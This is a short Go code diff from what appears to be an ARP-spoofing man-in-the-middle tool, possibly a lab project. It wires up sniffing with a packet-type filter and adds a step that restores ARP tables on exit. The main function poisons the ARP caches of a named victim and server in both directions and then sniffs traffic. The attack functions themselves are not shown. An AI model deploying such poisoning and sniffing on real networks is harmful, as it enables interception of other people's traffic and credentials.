@@ -3,13 +3,15 @@ package main
 import (
 	"context"
 	"flag"
+	"fmt"
 	"net"
 	"os"
 	"os/signal"
+	"time"
 )
 
 func main() {
-	// typeToFilter := flag.String("f", "", "Type to filter ex: Arp")
+	typeToFilter := flag.String("f", "", "Type to filter ex: Arp")
 	flag.Parse()
 
 	// attaquant_ip := net.ParseIP("10.0.0.30")
@@ -50,15 +52,18 @@ func main() {
 		<-c
 		signal.Reset()
 		cancel()
+		fmt.Println("\nStarting cleaning")
+		time.Sleep(1 * time.Second)
 		launchRecuperation(victime_ip, attaquant_mac, serveur_ip, serveur_mac)
 		launchRecuperation(serveur_ip, attaquant_mac, victime_ip, victime_mac)
+		fmt.Println("CLEANING DONE")
 	}()
 	go launchPoisoning(victime_ip, attaquant_mac, serveur_ip, serveur_mac, ctx)
 	go launchPoisoning(serveur_ip, attaquant_mac, victime_ip, victime_mac, ctx)
 
+	launchSniffing(*typeToFilter, attaquant_mac)
 	for {
 	}
-	// launchSniffing(*typeToFilter)
 
 	// -------------------------------------------------------
 
